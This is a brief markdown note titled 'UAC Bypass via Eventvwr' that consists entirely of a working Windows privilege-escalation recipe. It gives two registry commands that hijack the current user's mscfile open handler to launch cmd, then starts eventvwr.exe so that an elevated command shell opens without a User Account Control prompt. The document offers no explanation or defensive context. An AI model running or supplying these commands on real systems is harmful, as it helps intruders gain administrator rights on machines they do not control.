# UAC Bypass via Eventvwr

```powershell
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start cmd" /f
start eventvwr.exe
```